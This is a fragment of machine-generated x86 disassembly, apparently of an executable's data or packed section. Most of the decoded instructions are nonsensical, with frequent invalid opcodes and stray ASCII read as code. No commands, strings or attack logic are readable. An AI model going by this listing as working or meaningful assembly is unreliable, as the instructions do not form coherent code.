  40a78e:	dec    ecx
  40a78f:	lahf   
  40a790:	ja     0x40a7ca
  40a792:	out    dx,al
  40a793:	(bad)  
  40a794:	fbstp  TBYTE PTR [esi+0x6a]
  40a797:	(bad)  
  40a798:	outs   dx,DWORD PTR ds:[esi]
  40a799:	cmc    
  40a79a:	mov    ecx,0x8b8b8b4f
  40a79f:	jo     0x40a722
  40a7a1:	mov    ecx,DWORD PTR [ebx-0x7474679e]
  40a7a7:	mov    edi,edi
  40a7a9:	(bad)  
  40a7aa:	(bad)  
  40a7ab:	(bad)  
  40a7ac:	(bad)  
  40a7ad:	(bad)  
  40a7ae:	(bad)  
  40a7af:	(bad)  
  40a7b0:	(bad)  
  40a7b1:	mov    edi,0xb39538ce
  40a7b6:	ret    0xdf24
  40a7b9:	stos   BYTE PTR es:[edi],al
  40a7ba:	(bad)  
  40a7bb:	pop    esi
  40a7bc:	pop    ss
  40a7bd:	sti    
  40a7be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a7c0:	mov    edi,DWORD PTR [edi+ebx*2+0x33]
  40a7c4:	daa    
  40a7c5:	outs   dx,BYTE PTR ds:[esi]
  40a7c6:	rol    ebx,0xb7
	...
  40a7d1:	add    BYTE PTR [ebx+0xfb6038b],cl
  40a7d7:	mov    dh,0x8b
  40a7d9:	mov    ebx,ebp
  40a7db:	ret    
  40a7dc:	mov    esp,0x980d086e
  40a7e1:	cmp    eax,0x10c18965
  40a7e6:	mov    edi,DWORD PTR ds:0x896d789f
  40a7ec:	test   al,0x29
  40a7ee:	test   al,0xe1
  40a7f0:	and    edi,DWORD PTR [ebx+eax*8-0x6854bc08]
  40a7f7:	push   ebp
  40a7f8:	std    
  40a7f9:	addr16 and eax,0x8b8b9471
  40a7ff:	in     al,0xab
  40a801:	mov    ecx,DWORD PTR [ebx-0x74fc7936]
  40a807:	add    BYTE PTR [ebx-0x62dafea4],bl
  40a80d:	fdivr  st(4),st
  40a80f:	rcl    BYTE PTR [edi-0x3d175c9c],cl
  40a815:	dec    esi
  40a816:	cmp    eax,DWORD PTR [eax]
  40a818:	clc    
  40a819:	jge    0x40a7df
  40a81b:	(bad)  
  40a81c:	(bad)  
  40a81d:	nop
  40a81e:	push   edi
  40a81f:	inc    ebx
  40a820:	add    BYTE PTR [eax],al
  40a822:	add    bh,al
  40a824:	lock add DWORD PTR [ebp-0xa],ecx
  40a828:	mov    dl,bh
  40a82a:	jae    0x40a7ff
  40a82c:	inc    ecx
  40a82d:	and    ebx,DWORD PTR [edx-0x2]
  40a830:	mov    edi,0x9b478dd3
  40a835:	in     eax,0x8d
  40a837:	add    eax,0x2c39f700
  40a83c:	out    dx,al
  40a83d:	out    dx,eax
  40a83e:	ror    BYTE PTR [edi-0x40950000],1
  40a844:	fiadd  DWORD PTR [eax]
	...
  40a84e:	add    BYTE PTR [eax],al
  40a850:	add    dh,dh
  40a852:	int3   
  40a853:	and    al,ch
  40a855:	call   0xe9299142
  40a85a:	call   0x409147
  40a85f:	inc    ebx
  40a860:	jne    0x40a887
  40a862:	push   esi
  40a863:	jb     0x40a893
  40a865:	gs jb  0x40a8a2
  40a868:	ins    DWORD PTR es:[edi],dx
  40a869:	imul   ebp,DWORD PTR [ebp+0x2c],0x4d206f20
  40a870:	outs   dx,DWORD PTR ds:[esi]
  40a871:	cmp    al,0x79
  40a873:	popa   
  40a874:	push   ebx
  40a875:	jb     0x40a899
  40a877:	cmp    ah,BYTE PTR [edx]
  40a879:	bound  esp,QWORD PTR [eax]
  40a87b:	inc    esp
  40a87c:	inc    ebx
  40a87d:	jne    0x40a8eb
  40a87f:	ins    DWORD PTR es:[edi],dx
  40a880:	cs addr16 jae 0x40a8a6
  40a884:	push   ebx
  40a885:	inc    ecx
  40a886:	and    BYTE PTR [ebx+0x6d],dl
  40a889:	or     ch,BYTE PTR [edi+0x6f]
  40a88c:	imul   edi,DWORD PTR [edx+ecx*1],0xa706f6e
  40a893:	and    BYTE PTR [ebp+eax*2+0x76],dh
  40a897:	arpl   WORD PTR [ebx+0x6f],si
  40a89a:	and    BYTE PTR [edi+0x65],ch
  40a89d:	cmp    ch,BYTE PTR cs:[esp+edi*1]
  40a8a1:	jae    0x40a913
  40a8a3:	cmp    al,0x68
  40a8a5:	jae    0x40a914
  40a8a7:	and    BYTE PTR [ecx+0x6c],ch
  40a8aa:	fs jb  0x40a91c
  40a8ad:	and    BYTE PTR [edx],bh
  40a8af:	and    BYTE PTR gs:[edi+0x6f],dh
  40a8b3:	and    BYTE PTR [esi],ch
  40a8b5:	addr16 jbe 0x40a91d
  40a8b8:	ins    BYTE PTR es:[edi],dx
  40a8b9:	jb     0x40a91f
  40a8bb:	jns    0x40a8eb
  40a8bd:	je     0x40a911
  40a8bf:	dec    ebx
  40a8c0:	movsx  edx,WORD PTR [edi+edx*2-0x31f58fc]
  40a8c8:	xor    eax,0x2c37d3ef
  40a8cd:	cmp    BYTE PTR [ebp+0x1affffc1],dl
  40a8d3:	ret    0xffff
  40a8d6:	retf   
  40a8d7:	int3   
  40a8d8:	(bad)  
  40a8d9:	call   DWORD PTR [edx+0x20bd662a]
  40a8df:	or     eax,0x1539b896
  40a8e4:	inc    esi
  40a8e5:	imul   esi,DWORD PTR [eax],0x2dbe2960
  40a8eb:	inc    ebp
  40a8ec:	lods   al,BYTE PTR ds:[esi]
  40a8ed:	mov    bh,0x9f
  40a8ef:	sbb    ebx,DWORD PTR [eax+esi*8+0x44bc00ff]
  40a8f6:	pushf  
  40a8f7:	push   eax
  40a8f8:	add    BYTE PTR [eax],al
  40a8fa:	add    BYTE PTR [ebx+0x33196d50],ch
  40a900:	inc    esp
  40a901:	dec    esi
  40a902:	mov    ecx,0xe6f9a7d0
  40a907:	add    eax,ebp
  40a909:	lds    edi,FWORD PTR [edx+0x5a]
  40a90c:	loop   0x40a950
  40a90e:	jno    0x40a938
  40a910:	mov    edx,0xd76f8d9c
  40a915:	(bad)  
  40a916:	rcr    BYTE PTR [edx-0x1fe65723],cl
  40a91c:	mov    esp,0x2a000096
  40a921:	xchg   esp,eax
  40a922:	add    BYTE PTR [eax],al
  40a924:	add    BYTE PTR [ebp-0x72727273],cl
  40a92a:	lea    ecx,[ebp-0x13d57273]
  40a930:	imul   edi,edi,0xffffffff
  40a933:	(bad)  
  40a934:	(bad)  
  40a935:	(bad)  
  40a936:	(bad)  
  40a937:	(bad)  
  40a938:	(bad)  
  40a939:	inc    DWORD PTR [eax]
  40a93b:	add    BYTE PTR ds:0xd705ced3,dh
  40a941:	pop    ds
  40a942:	xor    al,0xb8
  40a944:	pop    ecx
  40a945:	jg     0x40a95f
  40a947:	(bad)  
  40a948:	or     eax,0x193cdad2
  40a94d:	std    
  40a94e:	sbb    BYTE PTR [ebx],0xab
  40a951:	add    BYTE PTR [eax-0x2d],cl
  40a954:	add    BYTE PTR [eax],al
  40a956:	imul   edi,DWORD PTR [ecx+0x2f49737a],0xb9f79386
  40a960:	xor    BYTE PTR ss:[edx-0x6d],dl
  40a964:	dec    esp
  40a965:	sar    DWORD PTR [ebx],cl
  40a967:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a968:	cmp    al,0x12
  40a96a:	out    dx,al
  40a96b:	inc    esp
  40a96c:	scas   al,BYTE PTR es:[edi]
  40a96d:	out    0x5,al
  40a96f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a970:	in     al,dx
  40a971:	dec    edx
  40a972:	fadd   DWORD PTR [eax]
  40a974:	add    al,al
  40a976:	pop    esp
  40a977:	bound  eax,QWORD PTR [eax]
  40a979:	add    BYTE PTR [ebx+ebx*8-0x27],ch
  40a97d:	add    BYTE PTR [eax],al
  40a97f:	inc    eax
  40a980:	push   0x335fbcdc
  40a985:	xor    al,0x4d
  40a987:	stos   DWORD PTR es:[edi],eax
  40a988:	mov    cl,0xfc
  40a98a:	(bad)  
  40a98b:	loope  0x40a9d8
  40a98d:	cli    
  40a98e:	jl     0x40a97d
  40a990:	add    esp,DWORD PTR [ebx-0x2c2d18bc]
  40a996:	pop    ds
  40a997:	add    BYTE PTR [eax],al
  40a999:	add    BYTE PTR [ebx],ch
  40a99b:	jmp    0x4bbaa9a0
  40a9a0:	add    BYTE PTR [eax],al
  40a9a2:	add    BYTE PTR [eax],cl
  40a9a4:	or     BYTE PTR [eax],cl
  40a9a6:	or     BYTE PTR [eax],cl
  40a9a8:	or     BYTE PTR [eax],cl
  40a9aa:	or     BYTE PTR [eax],cl
  40a9ac:	sbb    DWORD PTR [ebp+0x4e10d2d5],0x18
  40a9b3:	cdq    
  40a9b4:	mov    al,ds:0x77ad7689
  40a9b9:	add    eax,0xf2ca1680
  40a9be:	scas   eax,DWORD PTR es:[edi]
  40a9bf:	aas    
  40a9c0:	in     al,dx
  40a9c1:	(bad)  
  40a9c2:	stc    
  40a9c3:	add    DWORD PTR [esp+eax*1],0x4040404
  40a9ca:	add    al,0x4
  40a9cc:	add    al,0xff
  40a9ce:	dec    DWORD PTR [ecx-0xb38cc2]
  40a9d4:	jmp    DWORD PTR [eax]
  40a9d6:	aad    0x6d
  40a9d8:	lahf   
  40a9d9:	inc    esi
  40a9da:	lahf   
  40a9db:	fisubr DWORD PTR [edi-0x2879ee34]
  40a9e1:	push   0x38
  40a9e3:	shl    bh,1
  40a9e5:	aaa    
  40a9e6:	ss xchg ebp,eax
  40a9e8:	add    eax,0x955a2d89
  40a9ed:	int3   
  40a9ee:	iret   
  40a9ef:	pop    ebx
  40a9f0:	sub    BYTE PTR [edx],ah
  40a9f2:	xchg   DWORD PTR [esi+0x5c5d83d1],esp
  40a9f8:	(bad)  
  40a9f9:	call   DWORD PTR [ecx-0xc]
  40a9fc:	(bad)  
  40a9fd:	(bad)  
  40a9fe:	fidivr DWORD PTR [eax+0x166aff69]
  40aa04:	scas   al,BYTE PTR es:[edi]
  40aa05:	inc    edi
  40aa06:	pop    es
  40aa07:	and    al,0xcb
  40aa09:	jno    0x40aa3c
  40aa0b:	dec    esi
  40aa0c:	mov    ah,0xf
  40aa0e:	into   
  40aa0f:	add    BYTE PTR [ecx],0xb7
  40aa12:	(bad)  
  40aa13:	lock inc ecx
  40aa15:	imul   ecx,DWORD PTR [edx],0xd7706af2
  40aa1b:	push   0x6a
  40aa1d:	push   0xffffffaf
  40aa1f:	iret   
  40aa20:	mov    WORD PTR [ebx-0x3e],es
  40aa23:	mov    BYTE PTR [edx-0x5452be97],bh
  40aa29:	je     0x40aa17
  40aa2b:	push   edx
  40aa2c:	cld    
  40aa2d:	sbb    DWORD PTR [ebx+edi*8+0x9],eax
  40aa31:	fs pop edi
  40aa33:	inc    edi
  40aa34:	push   es
  40aa35:	fisttp QWORD PTR [eax]
  40aa37:	(bad)  
  40aa38:	mov    ebp,0x6a6a380d
  40aa3d:	mov    esp,0x6a6a0a9e
  40aa42:	push   0xffffff83
  40aa44:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  40aa4b:	xor    DWORD PTR [esi],0x6e
  40aa4e:	loopne 0x40aa50
	...
  40aa58:	add    BYTE PTR [eax],al
  40aa5a:	jmp    0x40aa3d
  40aa5c:	xor    DWORD PTR [esi-0x20],ebx
  40aa5f:	or     al,ch
  40aa61:	inc    ebx
  40aa62:	cmp    cl,al
  40aa64:	or     BYTE PTR ds:0x1e6ae0cc,bh
  40aa6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40aa6b:	stc    
  40aa6c:	push   ss
  40aa6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aa6e:	nop
  40aa6f:	dec    esi
  40aa70:	jmp    0xd3:0x3200006f
  40aa77:	add    BYTE PTR [edx],cl
  40aa79:	pop    esi
  40aa7a:	add    BYTE PTR [eax],al
  40aa7c:	push   edi
  40aa7d:	cmp    esp,ecx
  40aa7f:	jae    0x40aabc
  40aa81:	pop    ebx
  40aa82:	lahf   
  40aa83:	lock xor ch,dh
  40aa86:	ins    BYTE PTR es:[edi],dx
  40aa87:	ins    DWORD PTR es:[edi],dx
  40aa88:	and    BYTE PTR [edi],al
  40aa8a:	sub    bh,0x43
  40aa8d:	jmp    0x40aa33
  40aa8f:	xor    DWORD PTR [esi+0x48],ebx
  40aa92:	into   
  40aa93:	add    BYTE PTR gs:[ebp-0x12],dh
  40aa97:	aam    0x7c
  40aa99:	mov    BYTE PTR [ebp+0x75],dh
  40aa9c:	jne    0x40aad9
  40aa9e:	push   cs
  40aa9f:	retf   
  40aaa0:	xchg   esi,eax
  40aaa1:	jmp    0x9273db24
  40aaa6:	int    0xa4
  40aaa8:	sbb    ebx,DWORD PTR [esi]
  40aaaa:	sbb    eax,0x640a521
  40aaaf:	pop    eax
  40aab0:	xchg   esi,eax
  40aab1:	jp     0x40aa83
  40aab3:	sbb    edx,esi
  40aab5:	push   ecx
  40aab6:	sub    bh,BYTE PTR [edx-0x27]
  40aab9:	inc    ebp
  40aaba:	mov    DWORD PTR [eax+0x4b],ebx
  40aabd:	xlat   BYTE PTR ds:[ebx]
  40aabe:	retf   
  40aabf:	xor    BYTE PTR [ebp+0x75],dh
  40aac2:	test   eax,0x75757541
	...
  40aacf:	add    BYTE PTR [edx+0x4b],ah
  40aad2:	sub    al,0x89
  40aad4:	mov    DWORD PTR [ecx-0x76767677],ecx
  40aada:	mov    DWORD PTR [ecx+0x6be80000],ecx
  40aae0:	add    esi,eax
  40aae2:	sub    eax,0xdf9448af
  40aae7:	idiv   BYTE PTR [ecx+0x3a]
  40aaea:	loope  0x40aaa5
  40aaec:	cld    
  40aaed:	popa   
  40aaee:	dec    eax
  40aaef:	pop    ds
  40aaf0:	int    0xc1
  40aaf2:	or     BYTE PTR [eax+0x20e4],dh
  40aaf8:	inc    ecx
  40aaf9:	jbe    0x40aad5
  40aafb:	jno    0x40aae4
  40aafd:	int3   
  40aafe:	cmc    
  40aaff:	lahf   
  40ab00:	mov    ecx,0x362b9124
  40ab05:	gs push ebx
  40ab07:	xchg   edi,eax
  40ab08:	jecxz  0x40aaa8
  40ab0a:	pop    ecx
  40ab0b:	push   es
  40ab0c:	ja     0x40ab17
  40ab0e:	cmp    dh,dl
  40ab10:	pop    ss
  40ab11:	push   edx
  40ab12:	mov    eax,0x8602
  40ab17:	add    ecx,DWORD PTR [ecx+0x3f]
  40ab1a:	add    BYTE PTR [eax],al
  40ab1c:	xor    al,0x4a
  40ab1e:	stos   DWORD PTR es:[edi],eax
  40ab1f:	add    bh,bh
  40ab21:	push   esi
  40ab22:	mul    DWORD PTR [eax]
  40ab24:	and    DWORD PTR [edi+0x17],esi
  40ab27:	mov    DWORD PTR [edx+edi*1+0x5cf2e77a],edx
  40ab2e:	push   esp
  40ab2f:	and    al,0x6b
  40ab31:	xchg   edi,eax
  40ab32:	mov    eax,ds:0x94a50ca0
  40ab37:	retf   0xff42
  40ab3a:	(bad)  
  40ab3b:	call   FWORD PTR [edx+0x69]
  40ab3e:	(bad)  
  40ab3f:	(bad)  
  40ab40:	fadd   QWORD PTR [edi+edi*8-0x1]
  40ab44:	inc    DWORD PTR [eax]
  40ab46:	add    BYTE PTR [eax],al
  40ab48:	add    BYTE PTR [eax],al
  40ab4a:	add    BYTE PTR [edi+0x73],dl
  40ab4d:	imul   esp,DWORD PTR [ebp+0xd],0x782e526d
  40ab54:	arpl   WORD PTR [esi],bp
  40ab56:	inc    esp
  40ab57:	and    bh,BYTE PTR [eax+0x3d]
  40ab5a:	inc    esp
  40ab5b:	cs ins DWORD PTR es:[edi],dx
  40ab5d:	cs addr16 jb 0x40abd1
  40ab61:	jb     0x40abd6
  40ab63:	das    
  40ab64:	or     eax,0x20726573
  40ab69:	jbe    0x40abd0
  40ab6b:	je     0x40ab9b
  40ab6d:	imul   ebp,DWORD PTR [edi+0x70],0x6920742e
  40ab74:	inc    esp
  40ab75:	ins    DWORD PTR es:[di],dx
  40ab77:	je     0x40abe8
  40ab79:	push   edi
  40ab7a:	and    ah,BYTE PTR [eax]
  40ab7c:	push   ebx
  40ab7d:	bound  esp,QWORD PTR [esi+0x20]
  40ab80:	ds gs gs jo 0x40abf2
  40ab85:	push   ebx
  40ab86:	jb     0x40abb6
  40ab88:	jbe    0x40abf3
  40ab8a:	gs jb  0x40abaf
  40ab8d:	jo     0x40ac03
  40ab8f:	jae    0x40abf4
  40ab91:	and    BYTE PTR ds:[ecx+0x20],ch
  40ab95:	and    BYTE PTR [eax+eiz*1+0x20],dh
  40ab99:	sub    BYTE PTR [edi+0x20],ch
  40ab9c:	jb     0x40abdc
  40ab9e:	inc    ecx
  40ab9f:	ins    DWORD PTR es:[edi],dx
  40aba0:	jb     0x40ac15
  40aba2:	je     0x40abe8
  40aba4:	imul   esp,DWORD PTR [edx],0x20656564
  40abaa:	jb     0x40ac1a
  40abac:	ins    DWORD PTR es:[edi],dx
  40abad:	cs inc esp
  40abaf:	outs   dx,BYTE PTR ds:[esi]
  40abb0:	add    BYTE PTR [eax],al
  40abb2:	add    BYTE PTR [esi],ch
  40abb4:	neg    ah
  40abb6:	xchg   esi,eax
  40abb7:	mov    ebp,0xa98fbc0e
  40abbc:	(bad)  
  40abbe:	adc    eax,0x24715845
  40abc3:	cmc    
  40abc4:	mov    ds:0x7e5ed980,al
  40abc9:	int3   
  40abca:	in     eax,dx
  40abcb:	inc    ebp
  40abcc:	inc    ebp
  40abcd:	inc    ebp
  40abce:	inc    ebp
  40abcf:	inc    ebp
  40abd0:	inc    ebp
  40abd1:	inc    ebp
  40abd2:	inc    ebp
  40abd3:	inc    ebp
  40abd4:	mov    ecx,DWORD PTR [ebx-0x16510a95]
  40abda:	mov    ecx,DWORD PTR [ebx+0x2f813e6c]
  40abe0:	shl    DWORD PTR [ebx],0x3e
  40abe3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abe4:	mov    ecx,0xd79b0a8f
  40abe9:	popa   
  40abea:	mov    ds:0xe119c72f,eax
  40abef:	add    DWORD PTR [eax+0x6b],ebx
  40abf2:	mov    ah,0x7c
  40abf4:	enter  0xa774,0x50
  40abf8:	push   eax
  40abf9:	out    dx,al
  40abfa:	lods   al,BYTE PTR ds:[esi]
  40abfb:	pop    ss
  40abfc:	pop    ds
  40abfd:	sbb    al,0x3e
  40abff:	mov    ecx,DWORD PTR [ebx-0x7474b840]
  40ac05:	fwait
  40ac06:	sub    DWORD PTR [esi+0x444a8b8b],esp
  40ac0c:	not    BYTE PTR [ebp-0x20]
  40ac0f:	inc    ebx
  40ac10:	aam    0x92
  40ac12:	leave  
  40ac13:	cs mov ah,0x83
  40ac16:	outs   dx,DWORD PTR ds:[esi]
  40ac17:	lock stos DWORD PTR es:[edi],eax
  40ac19:	xchg   esp,eax
  40ac1a:	ins    DWORD PTR es:[edi],dx
  40ac1b:	lahf   
  40ac1c:	rcl    ecx,0xe3
  40ac1f:	jp     0x40ac01
  40ac21:	mov    al,ds:0xa58b8b8b
  40ac26:	add    DWORD PTR [ebx],ecx
  40ac28:	test   al,0x21
  40ac2a:	clc    
  40ac2b:	push   ecx
  40ac2c:	sahf   
  40ac2d:	ficomp WORD PTR [eax+0x3265c2e0]
  40ac33:	xchg   ecx,eax
  40ac34:	mov    ds:0x384a5be4,al
  40ac39:	scas   al,BYTE PTR es:[edi]
  40ac3a:	pusha  
  40ac3b:	or     al,BYTE PTR [esi+0x3]
  40ac3e:	inc    BYTE PTR [edx]
  40ac40:	pop    ss
  40ac41:	inc    ebp
  40ac42:	mov    ecx,DWORD PTR [ebx-0x747c3067]
  40ac48:	mov    ecx,DWORD PTR [ebx-0x17171718]
  40ac4e:	call   0xe929953b
  40ac53:	cmp    al,0xba
  40ac55:	pop    edi
	...
  40ac5e:	add    bh,bh
  40ac60:	(bad)  
  40ac61:	fsubr  DWORD PTR [ebx-0x9]
  40ac64:	sbb    ah,bh
  40ac66:	jns    0x40ac14
  40ac68:	je     0x40ac04
  40ac6a:	dec    ecx
  40ac6b:	(bad)  
  40ac6c:	jne    0x40ac66
  40ac6e:	jo     0x40ac4b
  40ac70:	mov    dx,WORD PTR [esi+0x7a79c6a]
  40ac77:	xchg   edx,eax
  40ac78:	mov    al,ds:0x360effff
  40ac7d:	(bad)  
  40ac7e:	inc    esp
  40ac80:	xor    eax,0x821fffff
  40ac85:	dec    esi
  40ac86:	mov    edi,0xd1516fdf
  40ac8b:	inc    edi
  40ac8c:	mov    edi,0x62fefdfc
  40ac91:	scas   eax,DWORD PTR es:[edi]
  40ac92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac93:	dec    ebp
  40ac94:	arpl   WORD PTR [eax-0x5c],dx
  40ac97:	aam    0xad
  40ac99:	jmp    0x2441ac74
  40ac9e:	es je  0x40ac84
  40aca1:	add    BYTE PTR [eax],al
  40aca3:	add    BYTE PTR [eax-0x72],cl
  40aca6:	pop    edi
  40aca7:	fwait
  40aca8:	adc    esp,DWORD PTR [ebp-0x8]
  40acab:	sbb    ebp,eax
  40acad:	retf   0x8d64
  40acb0:	arpl   WORD PTR [ecx+0x3d412b21],bp
  40acb6:	dec    ebx
  40acb7:	shr    DWORD PTR [ebx],0x2f
  40acba:	imul   edx,DWORD PTR [ebp-0x49],0x36
  40acbe:	test   eax,0x11bb2ab1
  40acc3:	in     eax,0xd3
  40acc5:	jp     0x40acee
  40acc7:	add    BYTE PTR [eax],al
  40acc9:	inc    esi
  40acca:	dec    ebp
  40accb:	add    BYTE PTR [eax],al
  40accd:	add    bh,bh
  40accf:	(bad)  
  40acd0:	(bad)  
  40acd1:	(bad)  
  40acd2:	(bad)  
  40acd3:	(bad)  
  40acd4:	(bad)  
  40acd5:	(bad)  
  40acd6:	dec    DWORD PTR [edx]
  40acd8:	shl    DWORD PTR [ebx+0x4040404],cl
  40acde:	add    al,0x4
  40ace0:	add    al,0x4
  40ace2:	add    al,0x85
  40ace4:	test   DWORD PTR [eax+0x6252ed1b],edi
  40acea:	or     al,BYTE PTR [esi]
  40acec:	sub    BYTE PTR [ebx-0x73],ch
  40acef:	inc    ebp
  40acf0:	mov    BYTE PTR [ebx-0x64db358c],bh
  40acf6:	(bad)  
  40acf7:	mov    ss,WORD PTR ds:0xaf7fda9c
  40acfd:	test   DWORD PTR [ebp-0x505534cc],eax
  40ad03:	leave  
  40ad04:	add    eax,0x4767ea81
  40ad09:	test   eax,0xc0b27238
  40ad0e:	(bad)  [esi+0x6f]
  40ad11:	inc    ecx
  40ad12:	pop    es
  40ad13:	add    ebx,DWORD PTR [edx+0x51]
  40ad16:	xchg   edx,eax
  40ad17:	pop    edx
  40ad18:	cs addr16 inc edx
  40ad1b:	retf   
  40ad1c:	test   DWORD PTR [ebp-0x7ac23883],eax
  40ad22:	test   DWORD PTR [esi-0x46],ebp
  40ad25:	lock test eax,ebp
  40ad28:	lods   eax,DWORD PTR ds:[esi]
  40ad29:	and    al,BYTE PTR [eax-0x59]
  40ad2c:	std    
  40ad2d:	dec    esi
  40ad2e:	pop    ebx
  40ad2f:	jl     0x40acb6
  40ad31:	outs   dx,DWORD PTR ds:[esi]
  40ad32:	popf   
  40ad33:	xchg   edi,eax
  40ad34:	add    BYTE PTR [ecx+0x233bb505],ah
  40ad3a:	aaa    
  40ad3b:	mov    ds:0x59dc7e99,eax
  40ad40:	call   0x50e4962d
  40ad45:	call   0xe9217432
  40ad4a:	call   0x89ca3737
  40ad4f:	mov    DWORD PTR [ecx-0x76767677],ecx
  40ad55:	xchg   edi,eax
  40ad56:	into   
  40ad57:	in     al,0xe4
  40ad59:	dec    esp
  40ad5a:	xchg   ebp,eax
  40ad5b:	adc    DWORD PTR gs:[edi+0x1fd68886],esp
  40ad62:	(bad)  
  40ad63:	pop    ss
  40ad64:	arpl   WORD PTR [ebx],si
  40ad66:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad67:	mov    eax,0x2e703d7f
  40ad6c:	sub    eax,DWORD PTR [esp+eax*1]
  40ad6f:	add    al,0x4
  40ad71:	add    al,0x4
  40ad73:	add    al,0x4
  40ad75:	add    al,0x0
  40ad77:	add    BYTE PTR [esi+edx*4-0x16],cl
  40ad7b:	(bad)  
  40ad7c:	add    BYTE PTR [eax],al
  40ad7e:	sbb    eax,ebx
  40ad80:	rol    BYTE PTR [edx+ecx*4-0x48],1
  40ad84:	jo     0x40ad36
  40ad86:	jl     0x40ad4e
  40ad88:	mov    dl,0x73
  40ad8a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad8b:	hlt    
  40ad8c:	inc    edi
  40ad8d:	inc    ebx
  40ad8e:	add    al,0x1b
  40ad90:	out    dx,al
  40ad91:	sub    ebx,eax
  40ad93:	sahf   
  40ad94:	ror    BYTE PTR [edx-0x60],1
  40ad97:	xchg   esi,eax
  40ad98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ad99:	aaa    
  40ad9a:	in     al,0x26
  40ad9c:	push   es
  40ad9d:	mov    esi,0x8774d6
  40ada2:	add    BYTE PTR [edi],bh
  40ada4:	sub    al,0x0
  40ada6:	add    BYTE PTR [eax-0x80],ch
  40ada9:	add    BYTE PTR gs:[ebx-0x4e1a3f51],al
  40adb0:	sub    DWORD PTR ss:[ecx+0x50],edx
  40adb4:	pop    ss
  40adb5:	jae    0x40adb3
  40adb7:	call   0xe3fe2091
  40adbc:	inc    eax
  40adbd:	mov    eax,ds:0xf98b12c4
  40adc2:	int3   
  40adc3:	xchg   esp,eax
  40adc4:	add    DWORD PTR [ebx-0x2d4e257d],0x1e
  40adcb:	or     BYTE PTR [ebx-0x64],ah
  40adce:	not    BYTE PTR [ebx+0x63]
  40add1:	mul    esi
  40add3:	and    dh,BYTE PTR [ebx]
  40add5:	or     dl,BYTE PTR fs:[ecx-0x54]
  40add9:	mov    cl,0xe2
  40addb:	in     al,dx
  40addc:	sbb    edi,DWORD PTR [eax-0x26]
  40addf:	(bad)  
  40ade0:	inc    esp
  40ade1:	sub    dl,ch
  40ade3:	mov    al,ds:0xf0d8383
  40ade8:	rol    BYTE PTR [ebx-0x17177c7d],1
  40adee:	call   0xe92996db
  40adf3:	call   0x6427bee0
  40adf8:	int3   
  40adf9:	int3   
  40adfa:	int3   
  40adfb:	int3   
  40adfc:	int3   
  40adfd:	int3   
  40adfe:	int3   
  40adff:	int3   
  40ae00:	int3   
  40ae01:	and    al,0x24
  40ae03:	pop    ecx
  40ae04:	xor    eax,0xf976ddc2
  40ae09:	inc    eax
  40ae0a:	mov    BYTE PTR [edx+0x2d],ah
  40ae0d:	pop    eax
  40ae0e:	and    bh,ch
  40ae10:	sbb    ebp,DWORD PTR [ebp+ecx*8+0x56e2ba26]
  40ae17:	or     eax,0x24a85116
  40ae1c:	and    al,0x97
  40ae1e:	jmp    0xc545d247
  40ae23:	and    al,0x24
  40ae25:	lds    esi,FWORD PTR [esp+ebp*1-0x23]
  40ae29:	test   eax,0x6657bdac
  40ae2e:	jns    0x40ae7d
  40ae30:	jae    0x40ae45
  40ae32:	pusha  
  40ae33:	mov    eax,ds:0xa8b45a1a
  40ae38:	hlt    
  40ae39:	jge    0x40ae26
  40ae3b:	xor    BYTE PTR ds:0x354a7524,ch
  40ae41:	rcr    DWORD PTR ds:0x37757575,cl
  40ae47:	xchg   esp,eax
  40ae48:	push   es
  40ae49:	mov    edx,0xa29d3952
  40ae4e:	iret   
  40ae4f:	ficomp DWORD PTR [ebx]
  40ae51:	lds    esi,FWORD PTR [ebp+edx*1+0x1257a6fc]
  40ae58:	push   ebp
  40ae59:	fwait
  40ae5a:	jbe    0x40ae36
  40ae5c:	jecxz  0x40ae21
  40ae5e:	sar    BYTE PTR [ebp-0x64],0x72
  40ae62:	pop    ebp
  40ae63:	loop   0x40adeb
  40ae65:	popf   
  40ae66:	aas    
  40ae67:	retf   
  40ae68:	out    0x75,al
  40ae6a:	jne    0x40ae21
  40ae6c:	push   es
  40ae6d:	jne    0x40aee4
  40ae6f:	jne    0x40ae71
	...
  40ae79:	jmp    0xe8e8:0xe8e87641
  40ae80:	call   0xe929976d
  40ae85:	add    BYTE PTR [eax],al
  40ae87:	clc    
  40ae88:	mov    ebp,0x802524aa
  40ae8d:	jp     0x40ae27
  40ae8f:	pop    ss
  40ae90:	cld    
  40ae91:	outs   dx,BYTE PTR ds:[esi]
  40ae92:	jl     0x40ae54
  40ae94:	repz sbb DWORD PTR [edi-0x11],eax
  40ae98:	jne    0x40af0c
  40ae9a:	and    dh,BYTE PTR [ebx+0x76]
  40ae9d:	cs jb  0x40aec3
  40aea0:	outs   dx,BYTE PTR ds:[esi]
  40aea1:	and    BYTE PTR [ebx+0x6d],dh
  40aea4:	cmp    al,0x6d
  40aea6:	gs jae 0x40aec9
  40aea9:	push   ebx
  40aeaa:	jae    0x40af1e
  40aeac:	and    BYTE PTR [eax+0x6f],dh
  40aeaf:	jae    0x40af20
  40aeb1:	and    BYTE PTR [ebx+0x50],dh
  40aeb4:	jo     0x40af0d
  40aeb6:	imul   edx,DWORD PTR cs:[edi+0x65],0x74236453
  40aebe:	sub    BYTE PTR [edx],ah
  40aec0:	ds ins DWORD PTR es:[edi],dx
  40aec2:	push   eax
  40aec3:	jae    0x40aef7
  40aec5:	outs   dx,BYTE PTR ds:[esi]
  40aec6:	gs sub al,0x73
  40aec9:	imul   esi,DWORD PTR [bp+di+0x63],0x62656552
  40aed1:	and    BYTE PTR [esi+0x61],ah
  40aed4:	bound  edi,QWORD PTR [ecx+0x70]
  40aed7:	cs bound esp,QWORD PTR gs:[ebp+eax*8+0x2b]
  40aedd:	or     eax,0xc6cc8b
  40aee2:	add    BYTE PTR [edi*2-0x7ad34631],dl
  40aee9:	enter  0x5700,0x23
  40aeed:	sub    eax,0x12b09fda
  40aef2:	call   0xde5f:0x71f3c402
